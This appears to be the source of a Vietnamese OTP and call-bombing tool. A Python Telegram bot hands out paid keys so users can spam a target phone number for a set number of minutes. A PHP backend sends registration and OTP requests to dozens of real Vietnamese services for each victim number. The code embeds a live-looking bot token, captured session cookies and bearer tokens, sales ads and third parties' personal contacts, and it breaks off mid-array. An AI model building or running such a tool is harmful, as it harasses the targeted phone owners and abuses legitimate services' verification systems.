import requests,random
from datetime import datetime, timedelta
from threading import Thread
import os
import telebot
import re
import webbrowser
import time
#config
xnhac = "\33[1;36m"
luc = "\33[1;32m"
vang = "\33[1;33m"
hong = "\33[1;35m"

if os.name == 'nt':
  os.system('cls')
else:
  os.system('clear')

print(f'{xnhac}\t Đang chạy Bot! / {datetime.now()}')
print("{vang} Bắt Đầu Nhận Lệnh")

bot_token = '7069500864:AAEDIcqBjGAnKiuYLYh_Y79V_1xHfuNplVs' #thay token bot nha ae token lấy ở botfather 

# đợi nó cài
#ae mua api spam call nhiều ib zalo mình nhé SIEUTHICODE.COM
#mua src bot xịn hơn ib mình bao dá rẻ
#hơi lâulâu
header = {"Accept": "application/json", "Content-Type": "application/json"}

bot = telebot.TeleBot(bot_token)
session = requests.Session()


@bot.message_handler(commands=['start']) # Này Để Ng dùng bấm lệnh /start thì bot sẽ phản hồi nhé
def start(message):
  if message.chat.username:
    username = '@' + message.chat.username
  else:
    username = f"{message.chat.first_name} {message.chat.last_name}"
  text = f'''
┏━━━━━━━━━━━━━━━━━━━━┓
┣➤ - Cách Chạy bot  [/hdsd]
┣➤ - Chạy bot spam gọi điện [/spamcall]
┗━━━━━━━━━━━━━━━━━━━━┛
'''
  bot.send_message(message.chat.id, text)


@bot.message_handler(commands=['hdsd'])
def how(message):
  text = '''
┏━━━━━━━━━━━━━━━━━━━━┓
┣➤ Để Sử Dụng Spam call thì dùng lệnh 
┣➤/spamcall 0877239630 5 
┣➤ trong đó 0877239630 là sdt muốn spam 
┣➤ còn số 5 là tựa chưng cho số phút spam
┗━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━┓
┣➤ Để Sử Dụng Spam Call Thì Lấy Key
┣➤ /getkey Để Lấy Key
┣➤ /key Để Nhập Key
┣➤ 1 Key Spam Được 1 Lần
┗━━━━━━━━━━━━━━━━━━━━┛
'''
  bot.send_message(message.chat.id, text)
@bot.message_handler(commands=['getkey'])
def getkey(message):
  def getkey():
    a = requests.get("?phone=${phoneNumber}&key=").text.split("<body>")[1].split("@") #thay link api nếu ae không có liên hệ zalo SIEUTHICODE.COM để mua 
    key = a[0].strip()
    url1 = a[1].split("<!--")[0]
    text = "link key : " + url1
    bot.send_message(message.chat.id, text)
    fi = open(f"list/key/{key}.txt","a+")
    fi.write("")
    fi.close()
  a = Thread(target=getkey, args=())
  a.start()

@bot.message_handler(commands=["key"])
def key(message):
  try:
    key = str(message.text.split(' ')[1]).strip()
    fi = open(f"list/key/{key}.txt","r")
    bot.send_message(message.chat.id, "key chính xác")
    os.remove(f"list/key/{key}.txt")
    id = str(message.chat.id).strip()
    fo = open(f"list/user/{id}.txt","a+")
    fo.write("")
    fo.close()
  except:
    bot.send_message(message.chat.id, "key sai")
@bot.message_handler(commands=['spamcall'])
def spam_momo(message):
  try:
    parameters = message.text.split(' ')
    phone = parameters[1]
    minutes = int(parameters[2])
    if not re.match(r'^\d{10}$', phone):
      raise ValueError('Số điện thoại không đúng định dạng')
  except (IndexError, ValueError):
    bot.send_message(
      message.chat.id,
      text=
      'Vui lòng nhập số điện thoại đúng định dạng 10 chữ số và số phút sau lệnh [/spamcall].\nVí dụ: [/momo 0987654321 5]'

    )
    return

  def refresh_url(phone, minutes):
    url = f"?phone=${phone}&key="#thay link api nếu ae không có liên hệ zalo SIEUTHICODE.COM để mua 120k bao nhiều call


    start_time = datetime.now()
    end_time = start_time + timedelta(minutes=minutes)

    refresh_count = 0

    while datetime.now() < end_time:
      # Refresh URL
      response = requests.get(url)
      if response.status_code == 200:
        refresh_count += 1
        bot.send_message(
          message.chat.id,
          f"┏━━━━━━━━━━━━━━━━━━━━┓\n┣➤ Bạn đang dùng tools spam call\n┣➤ đã spam  lần thứ {refresh_count}\n┣➤ với số điệ n thoại {phone} thành công\n┗━━━━━━━━━━━━━━━━━━━━┛\n"
        )

        current_time = datetime.now()
        remaining_time = (end_time - current_time).total_seconds()
        bot.send_message(
          message.chat.id,
          f"┏━━━━━━━━━━━━━━━━━━━━┓\n┣➤ Please wait 20 seconds to spam the next time\n┣➤ Đây là tools spam call\n┗━━━━━━━━━━━━━━━━━━━━┛\n"
        )
        time.sleep(20)  # Đợi 30 giây trước khi làm mới URL lần tiếp theo

    bot.send_message(
      message.chat.id,
      f"┏━━━━━━━━━━━━━━━━━━━━┓\n┣➤ successfully spam call sdt\n┣➤ SDT : {phone}\n┣➤ Thời gian : {minutes} Spam minutes on demand\n┗━━━━━━━━━━━━━━━━━━━━┛\n "
    )
  try:
    fil = open(f"list/user/{message.chat.id}.txt")
    os.remove(f"list/user/{message.chat.id}.txt")
    t = Thread(target=refresh_url, args=(phone, minutes))
    t.start()
  except:
    bot.send_message(message.chat.id, "vui lòng nhập /key để thêm key")
  

if __name__ == "__main__":
  bot.polling()
  <?php
#CODE BY TEAM LÊ ZĂN PÒ
#GỒM: KHANG, PÒ, LỘC
#DO MẤY THẰNG RÁC : LÊ MẠNH KIÊN, VŨ MINH NGỌC, LÊN DEV, THẾ THANH, ĐỖ THÀNH, TÙNG DƯơNG COMPUTER,...
#LÀ ĂN CẮP SHARE BÁN CỦA TEAM PÒ NÊN PÒ SẼ SHARE SOURCE NÀY
#MONG MN NÉ THÀNH PHẦN ĂN CẮP NÀY RA SAU CHẮC TƯơNG LAI LÀM ĂN CẮP ĂN CƯỚP ĂN XIN
#TKS CÁC B TRC KIA ĐÃ MUA KEY!
header('content-type: application/json');
if(isset($_GET["key"])){
	$key = $_GET["key"];
	$check = json_decode(file_get_contents("#urlkey".$key),true);
	if($key == "" or $check["status"] == "success"){
		if(isset($_GET["phone"])){
			$sdt = $_GET["phone"];
		} else if(isset($_POST["phone"])){
			$sdt = $_POST["phone"];
		} else {
			echo ECHOJSON(array("status" => "error", "msg" => "VUI LÒNG REQUESTS CÓ PHONE")); exit;
		}
	} else {
		echo ECHOJSON(array("status" => "error", "msg" => "KEY ERROR")); exit;
	}
} else {
	echo ECHOJSON(array("msg" => "KEY ERROR!")); exit;
}//chóng spam
if(strlen($sdt) < 10){
	echo ECHOJSON(array("status" => "error","msg" => "Vui Lòng Nhập Đúng Số Phone")); exit;
} else if(!$sdt){
	echo ECHOJSON(array("status" => "error","msg" => "Vui Lòng Nhập Đúng Số Phone")); exit;
} else if($sdt == "0833823392"){
	echo ECHOJSON(array("msg" => "Spam Admin Làm Gì Vậy Bạn Ơi :)))")); exit;
}
$MONEYVEO = MONEYVEO($sdt);/// otp callllll
if($MONEYVEO["MONEYVEO"] == "Thành Công"){$dem ++;} else {$error ++;}
$LOSHIP = LOSHIP($sdt);//send otp
if($LOSHIP["LOSHIP"] == "Thành Công"){$dem ++;} else {$error ++;}
$TUOITRE = TUOITRE($sdt);///send otp
if($TUOITRE["TT"] == "Thành Công"){$dem ++;} else {$error ++;}
$ATM = ATM($sdt);///send otp
if($ATM["ATM"] == "Thành Công"){$dem ++;} else {$error ++;}
$VIEON = VIEON($sdt);//send otp
if($VIEON["VIEON"] == "Thành Công"){$dem ++;} else {$error ++;}
$DONGPLUS = DONGPLUS($sdt);///otp call
if($DONGPLUS["DONGPLUS"] == "Thành Công"){$dem ++;} else {$error ++;}
$TIENOI = TIENOI($sdt);//otp call
if($TIENOI["TIENOI"] == "Thành Công"){$dem ++;} else {$error ++;}
$F88 = F88($sdt);//send otp
if($F88["F88"] == "Thành Công"){$dem ++;} else {$error ++;}
$TAMO = TAMO($sdt);///send otp
if($TAMO["TAMO"] == "Thành Công"){$dem ++;} else {$error ++;}
$META = META($sdt);///send otp
if($META["META"] == "Thành Công"){$dem ++;} else {$error ++;}
$VIETTELL = VIETTELL($sdt);///send otp
if($VIETTELL["VIETTEL"] == "Thành Công"){$dem ++;} else {$error ++;}
$VETTELL2 = VETTELL2($sdt);//send otp
if($VETTELL2["VT.VN"] == "Thành Công"){$dem ++;} else {$error ++;}
$ZALOPAY = ZALOPAY($sdt);//send otp
if($ZALOPAY["ZALOPAY"] == "Thành Công"){$dem ++;} else {$error ++;}
$FPTSHOP = FPTSHOP($sdt);//send otp
if($FPTSHOP["FPTSHOP"] == "Thành Công"){$dem ++;} else {$error ++;}
$TV360 = TV360($sdt);//send otp
if($TV360["TV360"] == "Thành Công"){$dem ++;} else {$error ++;}
$POPS = POPS($sdt);//send otp
if($POPS["POPS"] == "Thành Công"){$dem ++;} else {$error ++;}
$VAYSIEUDE = VAYSIEUDE($sdt);///send otp
if($VAYSIEUDE["VAYSIEUDE"] == "Thành Công"){$dem ++;} else {$error ++;}
$THANTAIOI = THANTAIOI($sdt);///otp call
if($THANTAIOI["THANTAIOI"] == "Thành Công"){$dem ++;} else {$error ++;}
$MCREDIT = MCREDIT($sdt);///send otp
if($MCREDIT["MCREDIT"] == "Thành Công"){$dem ++;} else {$error ++;}
$CAYDENTHAN = CAYDENTHAN($sdt);//otp call
if($CAYDENTHAN["DENTHAN"] == "Thành Công"){$dem ++;} else {$error ++;}
$DAIHOCFPT = DAIHOCFPT($sdt);///send otp
if($DAIHOCFPT["DAIHOCFPT"] == "Thành Công"){$dem ++;} else {$error ++;}
$CAFELAND = CAFELAND($sdt);
if($CAFELAND["CAFELAND"] == "Thành Công"){$dem ++;} else {$error ++;}
$FINDO = FINDO($sdt);
if($FINDO["FINDO"] == "Thành Công"){$dem ++;} else {$error ++;}
$ONCREDIT = ONCREDIT($sdt);
if($ONCREDIT["ONCREDIT"] == "Thành Công"){$dem ++;} else {$error ++;}
$AHAMOVE = AHAMOVE($sdt);
if($AHAMOVE["AHAMOVE"] == "Thành Công"){$dem ++;} else {$error ++;}
$MONEYDONG = MONEYDONG($sdt);
if($MONEYDONG["MONEYDONG"] == "Thành Công"){$dem ++;} else {$error ++;}
$FUNRING = FUNRING($sdt);
if($FUNRING["FUNRING"] == "Thành Công"){$dem ++;} else {$error ++;}
$WINMART = WINMART($sdt);
if($WINMART["WINMART"] == "Thành Công"){$dem ++;} else {$error ++;} 
$OLDFACEBOOK = OLDFACEBOOK($sdt);
if($OLDFACEBOOK["OLDFACEBOOK"] == "Thành Công"){$dem ++;} else {$error ++;} 
$VAMO = VAMO($sdt);
if($VAMO["VAMO"] == "Thành Công"){$dem ++;} else {$error ++;} 
$VIETID = VIETID($sdt);
if($VIETID["VIETID"] == "Thành Công"){$dem ++;} else {$error ++;} 
$GOTADI = GOTADI($sdt);
if($GOTADI["GOTADI"] == "Thành Công"){$dem ++;} else {$error ++;}
$CONCUNG = CONCUNG($sdt);
if($CONCUNG["CONCUNG"] == "Thành Công"){$dem ++;} else {$error ++;} 
$UBOFOOD = UBOFOOD($sdt);
if($UBOFOOD["UBOFOOD"] == "Thành Công"){$dem ++;} else {$error ++;} 
$VIETLOTT = VIETLOTT($sdt);
if($VIETLOTT["VIETLOTT"] == "Thành Công"){$dem ++;} else {$error ++;} 
$PHUCLONG = PHUCLONG($sdt);
if($PHUCLONG["PHUCLONG"] == "Thành Công"){$dem ++;} else {$error ++;} 
$GAPO = GAPO($sdt);
if($GAPO["GAPO"] == "Thành Công"){$dem ++;} else {$error ++;} 
$SWIFT247 = SWIFT247($sdt);
if($SWIFT247["SWIFT247"] == "Thành Công"){$dem ++;} else {$error ++;} 
$BIBABO = BIBABO($sdt);
if($BIBABO["BIBABO"] == "Thành Công"){$dem ++;} else {$error ++;} 
$array = array(
	"1" => $MM["MM"],
	"2" => $META["META"],
	"3" => $FPTSHOP["FPTSHOP"],
	"4" => $TV360["TV360"],
	"5" => $ATM["ATM"],
	"6" => $F88["F88"],
	"7" => $LOSHIP["LOSHIP"],
	"8" => $ZALOPAY["ZALOPAY"],
	"9" => $RB["RB"],
	"10" => $CAYDENTHAN["DENTHAN"],
	"11" => $MONEYVEO["MONEYVEO"],//call
	"12" => $TIENOI["TIENOI"],
	"13" => $ONCREDIT["ONCREDIT"],
	"14" => $DAIHOCFPT["DAIHOCFPT"],
	"15" => $VIETTELL["VIETTEL"],
	"16" => $VETTELL2["VT.VN"],
	"17" => $CAFELAND["CAFELAND"],
	"18" => $NNE["NNE"],
	"19" => $TAMO["TAMO"],
	"20" => $VAYSIEUDE["VAYSIEUDE"],
	"21" => $VAYVND["VAYVND"],
	"22" => $MCREDIT["MCREDIT"],
	"23" => $TUOITRE["TT"],
	"24" => $FINDO["FINDO"],
	"25" => $DONGPLUS["DONGPLUS"],
	"26" => $POPS["POPS"],
	"27" => $THANTAIOI["THANTAIOI"],
	"28" => $VIEON["VIEON"],
  "29" => $AHAMOVE["AHAMOVE"],
  "30" => $MONEYDONG["MONEYDONG"],
  "31" => $FUNRING["FUNRING"],
  "32" => $WINMART["WINMART"], 
  "33" => $OLDFACEBOOK["OLDFACEBOOK"],
  "34" => $VAMO["VAMO"], 
  "35" => $VIETID["VIETID"], 
  "36" => $GOTADI["GOTADI"], 
  "37" => $CONCUNG["CONCUNG"], 
  "38" => $UBOFOOD["UBOFOOD"], 
  "39" => $VIETLOTT["VIETLOTT"], 
  "40" => $PHUCLONG["PHUCLONG"], 
  "41" => $GAPO["GAPO"],
  "42" => $SWIFT247["SWIFT247"],
  "43" => $BIBABO["BIBABO"],
);
$data = array(
	"REQUESTS" => count($array),
	"SUCCESS" => $dem,
	"ERROR" => $error,
	"DATA-OPT" => $array
);
echo json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT); 
/*
YOUTUBE KIÊN 205 OFFICIAL
zalo: kien-coolboy 
MAIL: kientato28@gmail.com
*/
function BIBABO($sdt) {
  $Headers = array(
    "Host: bibabo.vn",
    "Connection: keep-alive",
    "Content-Length: 64",
    "Accept: */*",
    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With: XMLHttpRequest",
    "sec-ch-ua-mobile: ?1",
    "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform: \"Android\"",
    "Origin: https://bibabo.vn",
    "Sec-Fetch-Site: same-origin",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Dest: empty",
    "Referer: https://bibabo.vn/user/signupPhone",
    "Accept-Encoding: gzip, deflate, br",
    "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
    "Cookie: _ui_bi_=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; _ga=GA1.2.55963624.1683002314; _gid=GA1.2.593754343.1683002314; mp_376a95ebc99b460db45b090a5936c5de_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24device_id%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initial_referring_domain%22%3A%20%22bibabo.vn%22%7D; _gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; _fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravel_session=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
  );
  $Payload = http_build_query(array(
                "phone" => $sdt,
                "_token" => "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
            ));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://bibabo.vn/user/verify-phone");
  curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $Payload);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($ch);
  curl_close($ch);
  if(strpos($response, "Đăng ký thành công") !== false){
       return array("BIBABO" => "Thành Công");
	 } else {
		  return array("BIBABO" => "Thất Bại");
   }
}


function SWIFT247($sdt) {
    $url = "https://api.swift247.vn/v1/check_phone";
    $headers = array(
        "Host: api.swift247.vn",
        "content-length: 23",
        "accept: application/json, text/plain, */*",
        "content-type: application/json",
        "sec-ch-ua-mobile: ?1",
        "user-agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "origin: https://app.swift247.vn",
        "sec-fetch-site: same-site",
        "sec-fetch-mode: cors",
        "sec-fetch-dest: empty",
        "referer: https://app.swift247.vn/",
        "accept-encoding: gzip, deflate, br",
        "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    );
    $post_data = array("phone" => "84" . substr($sdt, 1, 10));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if (strpos($response, "OTP_NO_CONFIRMED") !== false) {
        $url = "https://api.swift247.vn/v1/request_new_otp";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
    }

    if (strpos($response, "success") !== false) {
         return array("SWIFT247" => "Thành Công");
	 } else {
		  return array("SWIFT247" => "Thất Bại");
   }
}

function KILO($sdt) {
    $Headers = array("Host: api.kilo.vn", "content-length: 54", "app-version: 1", "x-correlation-id: d5afa9c6-73cb-47bf-ad42-0672912b725b", "sec-ch-ua-mobile: ?1", "authorization: Bearer undefined", "user-agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "content-type: application/json", "accept: application/json", "i18next-language: vi", "api-version: 2", "platform: SELLER_WEB", "sec-ch-ua-platform: \"Android\"", "origin: https://seller.kilo.vn", "sec-fetch-site: same-site", "sec-fetch-mode: cors", "sec-fetch-dest: empty", "referer: https://seller.kilo.vn/", "accept-encoding: gzip, deflate, br", "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4");
    $email = random_string(6) . "@gmail.com"; // Email đăng ký tài khoản
    $data = json_encode(array("phone" => $sdt, "email" => $email));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.kilo.vn/users/check-new-user");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $result = curl_exec($ch);
    curl_close($ch);
        $response = json_decode($result, true);
        if ($response['status'] == "ACTIVE") {
             return array("KILO" => "Thành Công");
	 } else {
		  return array("KILO" => "Thất Bại");
   }
}
function GAPO($sdt) {
    $Headers = array(
        "Host: api.gapo.vn",
        "Content-Length: 31",
        "Content-Type: application/json",
        "Sec-Ch-Ua-Mobile: ?1",
        "Authorization: Bearer",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform: \"Android\"",
        "Accept: */*",
        "Origin: https://www.gapo.vn",
        "Sec-Fetch-Site: same-site",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://www.gapo.vn/",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    );
    $Data = array(
        "device_id" => "30a1bfa0-533f-45e9-be60-b48fb8977df2",
        "phone_number" => "+84-" . substr($sdt, 1, 10),
        "otp_type" => 0
    );
    $Options = array(
        "http" => array(
            "header" => implode("\r\n", $Headers),
            "method" => "POST",
            "content" => json_encode($Data),
            "ignore_errors" => true
        )
    );
    $Context = stream_context_create($Options);
    $Result = file_get_contents("https://api.gapo.vn/auth/v2.0/signup", false, $Context);
    if ($Result === false) {
         return array("GAPO" => "Thành Công");
	 } else {
		  return array("GAPO" => "Thất Bại");
   }
}


function PHUCLONG($sdt)
{
    $headers = array(
        "Host: api-crownx.winmart.vn",
        "content-length: 126",
        "accept: application/json",
        "content-type: application/json",
        "sec-ch-ua-mobile: ?1",
        "authorization: Bearer undefined",
        "user-agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "origin: https://order.phuclong.com.vn",
        "sec-fetch-site: cross-site",
        "sec-fetch-mode: cors",
        "sec-fetch-dest: empty",
        "referer: https://order.phuclong.com.vn/",
        "accept-encoding: gzip, deflate, br",
        "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    ); 
  
    $data = array('phoneNumber' => $sdt,'fullName' => 'Nguyễn Đặng Hoàng Hải', 'email' => 'vexnolove03@gmail.com', 'password' => 'Vrxx#1337');
    $datason = json_encode($data);
    $ch = curl_init('https://api-crownx.winmart.vn/as/api/plg/v1/user/register');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datason);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
         return array("PHUCLONG" => "Thành Công");
	 } else {
		  return array("PHUCLONG" => "Thất Bại");
   }
}



function VIETLOTT($sdt)
{
    $headers = array(
        "Host: api-mobi.vietlottsms.vn",
        "Connection: keep-alive",
        "Content-Length: 28",
        "ClientCallAPI: EMB",
        "deviceId: ",
        "sec-ch-ua-mobile: ?1",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Content-Type: application/json",
        "Accept: */*",
        "partnerChannel: WEB",
        "Identify-Device-Token: ",
        "checkSum: 887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
        "sec-ch-ua-platform: \"Android\"",
        "Origin: https://vietlott-sms.vn",
        "Sec-Fetch-Site: cross-site",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://vietlott-sms.vn/",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    ); 
    $data = array('phoneNumber' => $sdt);
    $datason = json_encode($data);
    $ch = curl_init('https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datason);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        return array("VIETLOTT" => "Thành Công");
	 } else {
		  return array("VIETLOTT" => "Thất Bại");
   }
       
}





function UBOFOOD($sdt) {
    $headers = array(
        "Host: ubofood.com",
        "Connection: keep-alive",
        "Content-Length: 54",
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua-mobile: ?1",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "Origin: https://ubofood.com",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://ubofood.com/register",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9",
        "Cookie: ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22771%22%2C%22name%22%3A%22Qu%E1%BA%ADn%2010%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2227199%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%2005%22%7D%2C%22text%22%3A%22132%20Ng%C3%B4%20Quy%E1%BB%81n%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.76224577192127%2C%22lng%22%3A106.66505889999999%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-02-21T06%3A51%3A50.44Z%22%2C%22updated_by%22%3A%22admin%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTQ0ODAxOTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.tZKNt4tPQ-9rMtFyEhnahBHVBbiaaDnkSVU6KZFYhjc5eOxonkUhZ7wRN9CttwFlS2wcD-TnYy3J510OGzPW_G_AhFWuunUzw5tp9VZtIj7c1n_xIZ3HkhLOeUftWMJqtepKEfT-HQgE3PZuHyKzbINm44DaV8he6NnqqFdrg8oSoZXHq9HesLmDdKXV1xv3pJmPb3lg6MNISW9uA3fg0tSpsbJP6-BfgHTwEGcRaGrCnVBBjqr6HoVkEbw-_2peISNwNONC_vld7z6IN3b9BxHPjPhiOKMNxYLuQw-r4EcU69GiWyIERX1Osv-f9pNvMcWJJM011nb7xTKro0sAeLlJyCThVIkx4NH8l_0zY3P0BuvHWtz9pX_jQBMurSI-lTm15sDOEmGP3LVAbteTVZuiY4xvfqUUxeC_CLYt7NwHAa7vILUvME3O8L8xmnAjvqjkxplzMmsjQOxGsIYgZ1kW_WG8bXTRx69oADfTtV6Gowllags3GfhsE4ThWxHusuU9S6LCag-LXKUnho0bzxbju-4-lwrCuduSNXqTXET0_fNX4hsrj2BbroDG5710j66kzLq7Nh2Td08m7RWUf2ALpAF88CoR8m6qTOF0E_XO8a5Y0qFcbevbtKmBVqV0YiCfkXXW9ceD0yFO_AJGwVWea6dCCVg2dVWg7jP9-HY",
        "_gcl_au=1.1.1777292794.1682944193",
        "_ga=GA1.1.962990047.1682944194",
        "_fbp=fb.1.1682944194191.2034199897",
        "_tt_enable_cookie=1",
        "_ttp=NECdknStPnwSILo-MDYYWVVd3RG",
        "_ga_KCGG79N4SY=GS1.1.1682944193.1.1.1682944197.0.0.0",
        "